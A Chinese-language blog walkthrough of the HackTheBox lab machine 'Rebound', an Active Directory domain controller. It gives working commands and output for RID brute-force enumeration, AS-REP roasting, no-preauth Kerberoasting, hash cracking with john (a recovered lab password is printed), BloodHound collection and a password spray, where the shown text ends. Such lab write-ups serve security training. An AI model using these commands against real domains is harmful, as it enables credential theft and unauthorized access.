---
title: "HTB Rebound"
description: "HackTheBox篇ADCS系列之Rebound"

date: 2025-03-28T12:06:05+08:00
lastmod: 2025-11-11T15:12:29+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - RID Cycling
  - AS-REP Roasting
  - Kerberoasting
  - Shadow Credentials
  - ACL abuse
  - RemotePotato0
  - DACL abuse
  - RBCD
---
<!--more-->

> 靶机ip：10.10.11.231

# 知识点

* RID枚举
* AS-REP Roasting
* 新型Kerberoasting
* 密码喷洒
* ACL权限滥用
* Shadow Credentials 攻击
* 利用RemotePotato0跨会话中继
* ReadGMSAPassword
* 约束委派
* 基于资源的约束委派
* PTH登录

# 信息收集

```shell
rustscan -a 10.10.11.231 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.231:53
Open 10.10.11.231:88
Open 10.10.11.231:135
Open 10.10.11.231:139
Open 10.10.11.231:389
Open 10.10.11.231:445
Open 10.10.11.231:464
Open 10.10.11.231:593
Open 10.10.11.231:636
Open 10.10.11.231:3268
Open 10.10.11.231:3269
Open 10.10.11.231:5985
Open 10.10.11.231:9389
Open 10.10.11.231:47001
Open 10.10.11.231:49666
Open 10.10.11.231:49664
Open 10.10.11.231:49665
Open 10.10.11.231:49667
Open 10.10.11.231:49671
Open 10.10.11.231:49686
Open 10.10.11.231:49687
Open 10.10.11.231:49688
Open 10.10.11.231:49701
Open 10.10.11.231:49716
Open 10.10.11.231:49737
```

扫描一下特别的端口，确定一下`hosts`文件内容

```shell
nmap -T4 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sV -sC 10.10.11.231
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 23:15 CST
Nmap scan report for dc01 (10.10.11.231)
Host is up (0.090s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-26 15:18:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2025-03-26T15:18:57+00:00; +2m23s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2025-03-26T15:18:57+00:00; +2m23s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2025-03-26T15:18:57+00:00; +2m23s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-26T15:18:57+00:00; +2m23s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m22s, deviation: 0s, median: 2m22s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-03-26T15:18:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.28 seconds
```

将下面的内容添加到`/etc/hosts`中

```hosts
10.10.11.231 dc01 rebound.htb dc01.rebound.htb
```



# SMB服务

```shell
smbclient -L //10.10.11.231
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shared          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.231 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

看到有个`Shared`共享，查看一下

```shell
smbclient //10.10.11.231/Shared
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 05:46:36 2023
  ..                                  D        0  Sat Aug 26 05:46:36 2023

                4607743 blocks of size 4096. 1025329 blocks available
smb: \>
```

没什么东西，使用`nxc`进行RID枚举，将最大数量设置成`10000`（多次测试后发现8000以后几乎没有用户）

```shell
nxc smb 10.10.11.231 -u "test" -p "" --rid-brute 10000 --log smb_rid_brute
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\test: (Guest)
SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.10.11.231    445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.10.11.231    445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.10.11.231    445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.231    445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.231    445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.231    445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.231    445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.10.11.231    445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.10.11.231    445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.231    445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.10.11.231    445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.10.11.231    445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         10.10.11.231    445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         10.10.11.231    445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         10.10.11.231    445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         10.10.11.231    445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         10.10.11.231    445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         10.10.11.231    445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         10.10.11.231    445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         10.10.11.231    445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         10.10.11.231    445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         10.10.11.231    445    DC01             7687: rebound\delegator$ (SidTypeUser)
```

发现很多用户名，并且保存到` smb_rid_brute`文件中了，将用户名提取出来

```shell
cat smb_rid_brute | grep SidTypeUser | awk -F'\' '{print $2}' | awk -F ' ' '{print $1}'
Administrator
Guest
krbtgt
DC01$
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
winrm_svc
batch_runner
tbrady
delegator$
```

将结果保存到`users.txt`中

# AS-REP Roasting

在只有用户名的条件下尝试一下`AS-REP Roasting`攻击

```shell
impacket-GetNPUsers -usersfile users.txt -dc-ip 10.10.11.231 -format john rebound.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$jjones@REBOUND.HTB:42622e361da5afc11efce8e6a5b9fb63$c5aebb2b60c7eb7d813577bbdc1434435bf5d12889a510343143b2f6dfa2e0fee10697476a088893e8af6b5171f674b7c94bf2a929ed634cc20438728f8eac05c4dfc8bf04c687bc8a00802e3d9bc33df35b181b965431c3aebc216605a0947a92e84176da698dc5696401c88aa727a9617d3699caa66487fc05b31dc7fbed38367fc24668a0f8b84c9c440978ed4d57b9586217b4918344b18e07cc33db95038fb9d865211df6371e3c394d01d5b07d5593d55ea7684fbe4228aea91185cfa815916ff6f9713f63199deb788ffc39466ff6ed63c5207b0c005b2035687d00ca04858a09ca5d4fcee3db
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

 得到一组 hash ，使用 `john` 破解一下

```shell
john jjones_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:39 DONE (2025-03-26 22:01) 0g/s 367694p/s 367694c/s 367694C/s  0841079575..*7¡Vamos!
Session completed.
```

失败了，可能是我字典的缘故，至少得到了一个 hash

# Kerberoasting

> 参考链接：https://www.semperis.com/blog/new-attack-paths-as-requested-sts/

从上述链接中可以得知，可以利用`AS-REP-roastable`用户来执行`Kerberoasting`，而无需预身份验证，所以我们利用`jjones`进行`Kerberoasting`

```shell
impacket-GetUserSPNs -no-preauth jjones -usersfile users.txt -dc-host 10.10.11.231 rebound.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$eb4679706c18e077e99402db$ddd49d2dcc1d45eb229a4d82c6a5d54a9670a0595cebbd3499957ebfcc329ecddb8c9f442837582a4991e79111e02c6d33ecaae6e6bd976493d1214327724f17b56e3a87c92e6cdba07d529f385b40ee751ebdb18e1fd59dc98157a560a7b5e85aa5b520cd5c66c4bd4fefac835c212063b4de5012ebb894ed3d1d15bfe56804abe3221821d676897a6ca1ad9b23078c82b3dac37b434a09301fff7efcf5e21d03b3bc9465a9f8cc19622f89768c2bc44090dca0d6229af0c474ca17c1c662d2e0ae5ff9a18e855869cdf3de68a170c7f87ae7f934441ccd57c089386c388c01551530a8c63f9e5827352b4c0f74473a9d0a26a3f1e7b7de887f2efdb9c05bf8e3ac62732f9d4447dfe65942f3ba0476a3703b67a593a492de2ddedc777c9d0547a72dbcac103aad947a6cde69e4e885fa2402a9c1ac27011542db948db9fe308610dcb50ab168fb777b16b8a67e69f2db2a613e255157663ee526d29446462e6e09faadb4fd747e3e956a14684102a2ea36c8eb6e450dc86bea95718f24ad47b70214d8336fee23716c6db20e0f3e18929ed42759673da3cd8249bb819bee3620eaa5b40753a46a6ceaf30d035f66f5301a5ea3c0ccd96b1300869f626442fe77812484d0c6797dd5d3f11c35c3d0a45d76c187ebe29ada55220eabe6b18651567812c574a2e78009e0b4e066639aec9075a28855530460651b07c5c320167f43b69cef317506a5db31d5d012213fb1b81103217a4a323df6bbb2ee2f7daff61cf3da178ba06709aaa6b56d4aedc808af3006f23545af6629d1ee9ad235528b27be60db10ca3a730556840e5023f6a19b556a95dd94a68d70ce84f56b41e251eab7bfe5aae2d962d35b7e87333b8e676430857555547c405092e519af63b8fb245c71aa242fa56c8f085250f5c3db5bcd36cc8cf53e765a079d25e770361258feaade84c995c41a4c096f37b8b762f8af9f5858fd93f55c98ba35e08b1e7cf996b3cf87aa678ebb1c575cae3f4268258a1571d86443d74bea954a0437c72b2ab00b97ba18ca239f74e74742d4144d5ae81a4f66eb5ee5685c959482b5e9ddae834e01a4a619111938642419b547a26aac9d7183e33dc6a5d160bbfbac11a8885e18eecfca2dcade6efe13ca0d1e0bd72b73f344d9b2e184e8f57610a2035497b51b075077c51ab0e7eda74afded32477592c5dd64a07040d8207e57441b98445f5843f6cf3d83c149544b13b7d8fdd94e2bf2d4ef2165a3205a16976645ec6be112e1aceb985a05356298e4a000d06ba37d3d013a7e29c9e014373b0b99f076029c1b94d575bdb9d330cf08edd589a1db3bba34362774807e4eb68af14bb81317c1b9a2dfdc0b19ccc14dd956bce6ae4a4ba13c7caf89aa7b2859d66147dbcc4a5e49ea83c534499003df1a279c9ded751306ee7995a2a35fabc4975aa2061f7b1c5042247d374e7b0943db16c68a7a5a8a
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$a3642f80cdfc9faf9bf1d0dc$5d559764822a096280be6d4806cac0e3d258aa1cbb9c8139090d3844788ddda75de32ebf2a09cee2e5936c5bc3ea4bfa1b6c114bda068abd651f206edf6d931210a9ef583e5fed04cb7c4282608745751fb65653f2289f66ada77dc6c0fee01f3e67c0b42953fd5db29bbd7aab18e55436bc8fdda249ef5ade9852bb767519402809b29413ec364f588e73427fe3eb7d40d6a5eee01474960d249dd6844e32598d3efda0d42add3c8ea9af419d608395e3a41a319431346544890839d112a8f2eea417442e1183969dad64332c16295223b0973b90a161e1c77fe11011e6af2f72518dc75f64764aaf5c381443a45d50227573f31f3a2c38fc93cec0093c89616540a8d3390ea95718b1df51af645b8eff3d9492f0aebe71d68f78c1f87fa2fe0b42be06c8bf26273d3e5f2d7f854bcc83615a193482434748176c1fbabfdc91ac7cd6af2b05c8863d4ef232d174944cf075d7de3be7cf9776c9b0be625d3ce0cd62b243be51fb9d9878da6a6333c2cc1fcd7b999421e07b21384f8df969be9a0f7f54c77a668df418fb2776890ee48c3029c6597797a4e6bacb4a06c5ef523a48a2b45bd6ffe3c9c0fcd3119faba222d9f0e8b46d6f6a853233515ac8a42c0f42888b565c1d391e9cc6f81c10b078700e15d8b52ff957c7f0b4c72aba5282cdaa253f6f94fc77c0bf8acfa7e329b9916bc2764ac3dcc33832561c3190a4e3e07d34ca1ed4a74535f0cb503981dc5fd3123c92d5b05e53ea732e6928e431ef60753b39f6afc3619eb71205e1bfa0818f32c564f467921914357b0410fad165a51a9a8cec69c9c0d0f2de8cde0d88d746892616e66cd9aa4f603243ef96298843ff33630bd8bb509ec1b5b3f8d7e2b7facfe1f61e508e9a8683fa322ea3e1be2d6bb2a81fce7264eeb1dd10d0049b4a3a5390e71204ff38bfdb4824ba5fac92b7dccd365c0eafb24dd7b0c17f5567d49f325caf1023e6049750a27343adf75dd9da66636ee498d79269bfe36388cf6b7074772576af3957aac3d2d9020857d5c2dba1442224af03b6e9f03b28cec44c411c9739a0cb48e27384971ae35f0a290b69bd0076fd7fd081a7d655e04ccc4ed6132e5b5ae8c8c5af4f1918a648e883a301867f329e30b2aea457f59dec972db7a9d43be8d170d44733293be45390cb7676e438618c87dba25fccc6289095b6d6d215a37798b598fd9455fbd81b02866df24542008a408bf2989fe99ec4921d09a73a4a63c0d74213aba25c4629b95b729e0b0ad4f83d97d34532572e9a0787a9572a5360e4a3235e48bf797b0e3a2af32238c8a5fe79836825b468bf037bfd2b56cf0f4399e289742a4d39ce42a5b7d03b148a7324a68f1ebe6c
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$76ffccd00fd6cec100003e294bfd49c9$f243e557524a289f9d624a13c07fc9083546a6a815aecc1593ea68b58a3ee4cc3e0da8a84ea8d1280cd1b5bdba6f054ab01b27e5f90c3efc2c186b1fb0a69ded8395fff79e499daf31d73ba0b22eef783d56c1c3e3145a4311a286041ecfd1e2f045f30f408fa53dc8ad63da1c350bc80655cb24f2fa28ca6d3545a29e439d342aeae1df3f5238bd3215c7310211de669c55333f6e2f4f69df227a8367b023ff578862a52af595ba2656ecfbd6232f02c6097466132de7035a465281a4b59b42cbf8fac30fcbedacc399355d59b8916c49fec2d2ef2b33fe4b262474ffc8fb54916f6ac1ca2a2332c22e1190e9f68d4a3d31c7ec71fea80618363ef34b8a74e76c1d610133478d3514645d02eeacd68bbcf89d35c590a0e4a2de80432745ba8a211aa66acbe31d9c9063d06a18777ad5632df81672a8318392a116d0ab8fb47f4966a180a55753681e93692736ae465ace0200845a4805755653b74265f0ff57cca0d0714b564cce91504873744d9cebb5100413c3596f0a4e2803786f0cb6511950f8730588420b37ebb9f34b0e29c83b185c4bbf1921a63cc1fe3e4060c91ccab36a7b5c4833b5848d67c869f23bc068636aa4d659dd2ccca0fe8a58cbd958b50b6ab2c8f674c17e395392111efef9a7da33bd7abceb23c927a46f82c3000118e3210b8618ea87b9821381482bd0ccc3a208a02ec1ff61a56f517ecf3073fee23ac3237b4fff94aa57d092671ffdcaef0a3304beab2bc2fd9ab15161998bcec0afc64e7f4fa38c4e4e1c5e4b6e973f626b881e9f380f989b3b597ed8a98004c3595af28a5e3469e6a250baf25d97d8c06e4039fd7f330630f7b82f4a5428c5d7d52036322c3eaf479d784def87da67f3f0574e79d32d37a37863b1107d3d571afc2b5ee2ce69f5d13d700602c2dfa6625be2ef80dfa1da6795c163260e09d74f7eb1fdc07e20f30d4f73ecf115381b7d31aa5d7f5e3423b3ba50c6dc6928b210206163a2d8c632ed2bad04e46ee22963875d741b8dfb228d5fcee2a82c9e8eccbe19b3c867d601b84d54ed70052dadd9b9a3bf3842a5ee0b2743f6604e02f8c8144540fb347faeeab838c206adff8f06949a0ce77594924e8e60298632458bca0f1bd5b33057283980b82a1fd75ebdbdd42a76b133a83eb27087cee826d1a220ea183b84d15e04d06dee2120beab37bcea7888a29ed25522fd5ab247fa0185b7b02014a9b78a3180fad5e1404718481b75724e174856da90eaa6defa8bbe7f371b698fa0c89b367ea6562c12a2082a098750b710ddf65e9167e45f2bb2be333b9dbf14fa9e4796d20960234427716d5fdaabe21d10cd8dd3b91a136a456fb4124f
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$4fdf3b232c7fd08865bb7d32$629d55094372b866eb455a9877847145df7bea3b552903e570afddfc666fdf7c5498ec6eb0e7f1863919c1149f8820a206916b7e3c09df75ebba74a5684deeefd76c0a0fee9b55053142d1a36e1452b9ec68ad8201976be42ca30898fb208231ea039b6b048974ac6ebb32d132d76e3e29dd9f32de994b68979603ec3188e46ecd6c460238aa38d26fba569d5c5db157eea48280d1980f5770140447171225e266b9c331ac3aa35ab6b3eff95d65d0a705e6942358d7a31bfc39d231047551183be16478ca81da7430d156f4b9f23506a74a05c564b10108c71eea4e9482fece179136e6fd2a685d6133e3d10f451180aad7859d6bfdd987f908d3c659eb1de8b0c02e5a3fb4bf63784f439bb11202dfbfdc6f2f128cb5d9b6f2424ff612f93008ad2b5cca66eba746931e213a395272259ed00d26add46586d160f7a31ce8badde4f369abb1330b43f714eeca477f45dc6118fb1a911fd0e219efa1e864323100e5bde957c4bb8bf169dfde4e2349b3d0c3a201dae3a0f4409f1da017d7d0309c206c774a00df8791ad87abf2f96e39495a98f38a557bfaa227ba88f12f6feeaa154c9dae682336701cc07ddf56821e7f388a161a13b11fc5ba52243a3ce290b394037571d6e31a7f6c53e373386a0b5abf26a235abe41b6afde63211813fd4ae5e295ff67597f24e7a253a8636cc71032919efac4e3b11e219b3e0252682bcd92ad5e8b07fdc759ac7c10af9eaef76f8de56dd482f064197c4a23e94057626a1eec508b58efbfaa13f773d08ef0a1c1a9f3bccb8d45bc758a143268f9029c3459f0d78f56f6bcaefb3d8e6a35ec82a18211263892b16ce7490e886f84779f487619e6509dd21130393ad5861f1fa6a954800d32fd0f4c7a02f3852c4812512c516340eb6694e42bf6caa9cc46cec6015016b4d83a79fae89bd5052dc211b1ef067e902c02ec0e31a56ad9c714f055cd6e0f69cc8701ef0beefb5d0c74b4183d1b9cb0578d2ab52eb52a58bb7b23476c66c3ae01a4108c8deb84f19d9e4e7392320d931364534e8063ea48347bb42ff62e291ae3daa50575421d652775d16e48fe5656adcd7dfbf631023e66e48ca0fcc969fa7334e90c4bad7cfcd4df280c75333787e496d7810b64024d64f22a70576cccf4e2444e47a2ade22f06f7539f1df25e400ffbc950c96e91f6f46f37fd7f6943760431f1c157fd8b47be639eb4818ab756051e9f0f16d4aa6093268ef3f130ebe1a8cb065fb4513f724c47f595a411e38fd1d06a31b92f79c6161fdd8342164ec3534ba805fdecf4579b3baaac439435949dc3d5b375d997d156e22aaf07a4a392c1bdc51479e3f9a7b57e8057d3aad8cde5b0bc079933e
```

注意到拿到了四个账户的 hash ，但是看起来 `ldap_monitor` 像是能尝试破解一下，其他账户都是机器账户

使用 `john` 破解一下

```shell
john ldap_monitor_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1GR8t@$$4u       (?)
1g 0:00:00:21 DONE (2025-03-26 22:16) 0.04653g/s 606799p/s 606799c/s 606799C/s 1Gobucs!..1Eoska6
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

破解成功，拿到一组凭据

```info
username: ldap_monitor
password: 1GR8t@$$4u
```

使用`nxc`验证一下

```shell
nxc smb 10.10.11.231 -u 'ldap_monitor' -p '1GR8t@$$4u'
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u

nxc ldap 10.10.11.231 -u 'ldap_monitor' -p '1GR8t@$$4u'
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u
LDAPS       10.10.11.231    636    DC01             [-] LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.
```

发现可以访问smb，但是ldap还是不可以访问，尝试申请票据后加`-k`参数验证

先同步时间

```shell
ntpdate -s rebound.htb
```

申请票据

```shell
impacket-getTGT 'rebound.htb'/'ldap_monitor':'1GR8t@$$4u' -dc-ip 10.10.11.231
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ldap_monitor.ccache
```

导入票据

```shell
export KRB5CCNAME=ldap_monitor.ccache
```

加`-k`参数重新验证 `ldap`

```shell
nxc ldap 10.10.11.231 -u 'ldap_monitor' -p '1GR8t@$$4u' -k
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\ldap_monitor
```

验证通过

# bloodhound信息收集

有域用户了，但是尝试后发现`winrm`登录失败，所以进行`bloodhound`信息收集

```shell
bloodhound-python -d rebound.htb -c all -u ldap_monitor -p '1GR8t@$$4u' -ns 10.10.11.231 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.rebound.htb
INFO: Done in 00M 23S
INFO: Compressing output into 20250326231730_bloodhound.zip
```

使用`bloodhound`分析，点击`Shortest Paths to Unconstrained Delegation Systems`

![image-20250326165542837](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250326165544039-1390722587.png)

注意到貌似有一条可利用的路线，可以看到`winrm_svc`用户可以通过`CanPSRemote`登录

所以我们的目标就明确了，再往前看发现`ServiceMgmt`在`Service Users`组织单元(OU)上具有`GenericAll`权限

但是最前面的三个用户，我们现在一个也没接触到，所以浅试一下密码喷洒，看看能否得到更多用户的信息

# 密码喷洒

由于我们只有一个密码，所以我们尝试用这个喷洒

```shell
nxc ldap 10.10.11.231 -u users.txt -p '1GR8t@$$4u' -k --continue-on-success
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\Guest:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u KDC_ERR_CLIENT_REVOKED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
